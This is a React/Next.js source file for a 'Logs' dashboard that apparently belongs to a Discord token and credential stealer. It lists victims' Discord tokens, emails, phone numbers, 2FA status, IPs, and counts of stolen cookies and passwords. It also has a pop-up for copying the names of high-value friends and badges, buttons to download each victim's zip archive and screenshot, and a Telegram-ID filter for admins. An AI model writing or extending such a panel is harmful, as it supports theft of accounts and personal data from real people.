"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { ChevronDown, Copy, Download, Users, X } from "lucide-react";
import { Page, PageHead } from "@/components/shell/app-shell";
import { Surface } from "@/components/ui/surface";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { play } from "@/lib/sound";
import { cn } from "@/lib/utils";
import { PageSkeleton } from "@/components/ui/skeleton";
import { badgeUrl, parseBadgeTokens } from "@/lib/badges";

type Row = {
  id: number;
  tg_id: number;
  created_at: number;
  host: string | null;
  os: string | null;
  ip: string | null;
  username: string | null;
  discord_id: string | null;
  token: string | null;
  email: string | null;
  phone: string | null;
  mfa: string | null;
  badges: string | null;
  cookies: number;
  passwords: number;
  hq_friends: number;
  friends_json: string | null;
  zip_path: string | null;
  meta_json: string | null;
};

function hasScreen(r: Row) {
  try {
    const m = JSON.parse(r.meta_json || "{}") as { screen_path?: string };
    return Boolean(m.screen_path);
  } catch {
    return false;
  }
}

type Friend = { user: string; badges: string };

function fmt(ts: number) {
  try {
    return new Date(ts * 1000).toLocaleString("en-US");
  } catch {
    return String(ts);
  }
}

function shortTok(t: string | null) {
  if (!t) return "—";
  if (t.length <= 18) return t;
  return `${t.slice(0, 10)}…${t.slice(-6)}`;
}

function friendsOf(row: Row): Friend[] {
  try {
    const v = JSON.parse(row.friends_json || "[]");
    return Array.isArray(v) ? v : [];
  } catch {
    return [];
  }
}

function BadgeIcons({ raw, size = 16 }: { raw: string | null | undefined; size?: number }) {
  const toks = parseBadgeTokens(raw);
  if (!toks.length) return <span className="text-zinc-600">—</span>;
  return (
    <span className="inline-flex flex-wrap items-center gap-0.5">
      {toks.map((t, i) => {
        const src = badgeUrl(t);
        if (!src) return null;
        return (
          <img
            key={`${t.emojiId}-${i}`}
            src={src}
            alt={t.name}
            title={t.name.replace(/^larp_/, "")}
            width={size}
            height={size}
            className="inline-block shrink-0"
            style={{ width: size, height: size }}
            onError={(e) => {
              (e.currentTarget as HTMLImageElement).style.display = "none";
            }}
          />
        );
      })}
    </span>
  );
}

export default function LogsPage() {
  const router = useRouter();
  const [rows, setRows] = useState<Row[]>([]);
  const [role, setRole] = useState<"admin" | "user">("user");
  const [tg, setTg] = useState("");
  const [open, setOpen] = useState<number | null>(null);
  const [hq, setHq] = useState<Row | null>(null);
  const [hqPage, setHqPage] = useState(0);
  const [live, setLive] = useState(true);
  const [busy, setBusy] = useState(false);
  const [ready, setReady] = useState(false);

  const load = useCallback(async () => {
    setBusy(true);
    try {
      const sp = new URLSearchParams();
      sp.set("limit", "200");
      if (/^\d+$/.test(tg.trim())) sp.set("tgId", tg.trim());
      const res = await fetch(`/api/logs?${sp}`);
      if (res.status === 401) {
        router.push("/login");
        return;
      }
      const data = await res.json();
      setRows(data.rows || []);
      if (data.role === "admin" || data.role === "user") setRole(data.role);
      setLive(true);
    } catch {
      setLive(false);
    } finally {
      setBusy(false);
      setReady(true);
    }
  }, [router, tg]);

  useEffect(() => {
    void load();
    const t = setInterval(() => void load(), 8000);
    return () => clearInterval(t);
  }, [load]);

  const hqList = useMemo(() => (hq ? friendsOf(hq) : []), [hq]);
  const pageSize = 12;
  const hqPages = Math.max(1, Math.ceil(hqList.length / pageSize));
  const hqSlice = hqList.slice(hqPage * pageSize, hqPage * pageSize + pageSize);

  async function copy(text: string) {
    try {
      await navigator.clipboard.writeText(text);
      play("ok");
    } catch {
      play("err");
    }
  }

  if (!ready) return <PageSkeleton table className="max-w-6xl" />;

  return (
    <>
      <Page className="max-w-6xl">
        <PageHead
          kicker="02 / logs"
          title="Logs"
          desc="Sessions from webhooks"
          action={
            <div className="flex items-center gap-2">
              <span
                className={cn(
                  "inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-[11px] font-medium",
                  live
                    ? "border-white/15 bg-white/[0.06] text-zinc-200"
                    : "border-red-500/20 bg-red-500/10 text-red-300",
                )}
              >
                <span
                  className={cn(
                    "size-1.5 rounded-full",
                    live ? "bg-white shadow-[0_0_8px_rgba(255,255,255,0.7)]" : "bg-red-400",
                  )}
                />
                {live ? "live" : "offline"}
              </span>
              {role === "admin" ? (
                <Input
                  className="h-9 w-28"
                  value={tg}
                  onChange={(e) => setTg(e.target.value.replace(/\D/g, ""))}
                  placeholder="tg id"
                />
              ) : null}
              <Button type="button" variant="outline" size="sm" disabled={busy} onClick={() => void load()}>
                refresh
              </Button>
            </div>
          }
        />

        <Surface className="overflow-hidden p-0">
          <div className="overflow-x-auto">
            <table className="w-full min-w-[920px] text-left text-sm">
              <thead className="border-b border-white/10 bg-white/[0.03] text-[11px] uppercase tracking-[0.14em] text-zinc-500">
                <tr>
                  <th className="px-4 py-3 font-medium">#</th>
                  <th className="px-4 py-3 font-medium">user</th>
                  <th className="px-4 py-3 font-medium">token</th>
                  <th className="px-4 py-3 font-medium">badges</th>
                  <th className="px-4 py-3 font-medium">ck</th>
                  <th className="px-4 py-3 font-medium">pw</th>
                  <th className="px-4 py-3 font-medium">ip</th>
                  <th className="px-4 py-3 font-medium">time</th>
                  <th className="px-4 py-3 font-medium">hq</th>
                  <th className="px-4 py-3 font-medium" />
                </tr>
              </thead>
              <tbody>
                {rows.length === 0 ? (
                  <tr>
                    <td colSpan={10} className="px-4 py-16 text-center text-sm text-zinc-500">
                      no entries yet — new webhook hits show up here
                    </td>
                  </tr>
                ) : (
                  rows.map((r) => {
                    const expanded = open === r.id;
                    return (
                      <FragmentRow
                        key={r.id}
                        row={r}
                        expanded={expanded}
                        onToggle={() => {
                          play("tap");
                          setOpen(expanded ? null : r.id);
                        }}
                        onHq={() => {
                          play("tap");
                          setHq(r);
                          setHqPage(0);
                        }}
                        onCopy={copy}
                      />
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </Surface>
      </Page>

      {hq ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4 backdrop-blur-sm">
          <div className="relative w-full max-w-lg overflow-hidden rounded-3xl border border-white/10 bg-zinc-950 shadow-[0_30px_90px_rgba(0,0,0,0.55)]">
            <div className="flex items-center justify-between border-b border-white/10 px-5 py-4">
              <div>
                <p className="text-[11px] uppercase tracking-[0.18em] text-zinc-500">hq friends</p>
                <h2 className="mt-1 font-heading text-lg font-semibold text-white">
                  @{hq.username || "—"} · {hqList.length}
                </h2>
              </div>
              <button
                type="button"
                className="rounded-xl p-2 text-zinc-400 hover:bg-white/5 hover:text-white"
                onClick={() => {
                  play("tap");
                  setHq(null);
                }}
              >
                <X className="size-4" />
              </button>
            </div>
            <div className="max-h-[55vh] space-y-2 overflow-y-auto px-5 py-4">
              {hqSlice.length === 0 ? (
                <p className="py-8 text-center text-sm text-zinc-500">list empty</p>
              ) : (
                hqSlice.map((f, i) => (
                  <div
                    key={`${f.user}-${i}`}
                    className="flex items-start justify-between gap-3 rounded-2xl border border-white/8 bg-white/[0.03] px-3 py-2.5"
                  >
                    <div className="min-w-0">
                      <p className="truncate font-mono text-sm text-zinc-100">{f.user}</p>
                      {f.badges ? (
                        <div className="mt-1.5">
                          <BadgeIcons raw={f.badges} size={18} />
                        </div>
                      ) : null}
                    </div>
                    <button
                      type="button"
                      className="shrink-0 rounded-lg p-1.5 text-zinc-500 hover:bg-white/5 hover:text-white"
                      onClick={() => void copy(f.user)}
                    >
                      <Copy className="size-3.5" />
                    </button>
                  </div>
                ))
              )}
            </div>
            <div className="flex items-center justify-between border-t border-white/10 px-5 py-3">
              <p className="text-xs text-zinc-500">
                {hqPage + 1} / {hqPages}
              </p>
              <div className="flex gap-2">
                <Button
                  type="button"
                  size="sm"
                  variant="outline"
                  disabled={hqPage <= 0}
                  onClick={() => setHqPage((p) => Math.max(0, p - 1))}
                >
                  prev
                </Button>
                <Button
                  type="button"
                  size="sm"
                  variant="outline"
                  disabled={hqPage >= hqPages - 1}
                  onClick={() => setHqPage((p) => Math.min(hqPages - 1, p + 1))}
                >
                  next
                </Button>
              </div>
            </div>
          </div>
        </div>
      ) : null}
    </>
  );
}

function FragmentRow({
  row: r,
  expanded,
  onToggle,
  onHq,
  onCopy,
}: {
  row: Row;
  expanded: boolean;
  onToggle: () => void;
  onHq: () => void;
  onCopy: (t: string) => void;
}) {
  return (
    <>
      <tr className="border-b border-white/5 text-zinc-300 hover:bg-white/[0.02]">
        <td className="px-4 py-3 font-mono text-xs text-zinc-500">{r.id}</td>
        <td className="px-4 py-3 font-mono text-xs">{r.username || "—"}</td>
        <td className="px-4 py-3 font-mono text-xs text-zinc-400">{shortTok(r.token)}</td>
        <td className="max-w-[160px] px-4 py-3 text-xs text-zinc-500">
          <BadgeIcons raw={r.badges} size={16} />
        </td>
        <td className="px-4 py-3 font-mono text-xs">{r.cookies ?? 0}</td>
        <td className="px-4 py-3 font-mono text-xs">{r.passwords ?? 0}</td>
        <td className="px-4 py-3 font-mono text-xs text-zinc-400">{r.ip || "—"}</td>
        <td className="px-4 py-3 text-xs text-zinc-500">{fmt(r.created_at)}</td>
        <td className="px-4 py-3">
          <button
            type="button"
            className="inline-flex items-center gap-1 rounded-lg border border-white/10 px-2 py-1 text-[11px] text-zinc-300 hover:bg-white/5"
            onClick={onHq}
            disabled={!r.hq_friends}
          >
            <Users className="size-3" />
            {r.hq_friends || 0}
          </button>
        </td>
        <td className="px-4 py-3">
          <button
            type="button"
            className="rounded-lg p-1.5 text-zinc-500 hover:bg-white/5 hover:text-white"
            onClick={onToggle}
          >
            <ChevronDown className={cn("size-4 transition", expanded && "rotate-180")} />
          </button>
        </td>
      </tr>
      {expanded ? (
        <tr className="border-b border-white/5 bg-white/[0.015]">
          <td colSpan={10} className="px-4 py-4">
            <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
              <Field
                label="token"
                value={r.token || "—"}
                mono
                action={
                  r.token ? (
                    <button type="button" onClick={() => onCopy(r.token!)} className="text-zinc-500 hover:text-white">
                      <Copy className="size-3.5" />
                    </button>
                  ) : null
                }
              />
              <Field label="email" value={r.email || "—"} mono />
              <Field label="phone" value={r.phone || "—"} mono />
              <Field label="2fa" value={r.mfa || "—"} />
              <Field label="host / os" value={`${r.host || "—"} · ${r.os || "—"}`} />
              <Field label="ip" value={r.ip || "—"} mono />
              <Field label="discord id" value={r.discord_id || "—"} mono />
              <div className="flex items-end gap-2">
                {r.zip_path ? (
                  <Button asChild size="sm" variant="outline">
                    <a href={`/api/logs/${r.id}/download`}>
                      <Download className="size-3.5" /> zip
                    </a>
                  </Button>
                ) : (
                  <Badge tone="muted">no zip</Badge>
                )}
                {hasScreen(r) ? (
                  <Button asChild size="sm" variant="outline">
                    <a href={`/api/logs/${r.id}/download?t=png`} target="_blank" rel="noreferrer">
                      screen
                    </a>
                  </Button>
                ) : null}
              </div>
            </div>
          </td>
        </tr>
      ) : null}
    </>
  );
}

function Field({
  label,
  value,
  mono,
  action,
}: {
  label: string;
  value: string;
  mono?: boolean;
  action?: React.ReactNode;
}) {
  return (
    <div className="rounded-2xl border border-white/8 bg-zinc-950/40 px-3 py-2.5">
      <div className="mb-1 flex items-center justify-between gap-2">
        <p className="text-[10px] uppercase tracking-[0.16em] text-zinc-500">{label}</p>
        {action}
      </div>
      <p className={cn("break-all text-sm text-zinc-200", mono && "font-mono text-xs")}>{value}</p>
    </div>
  );
}
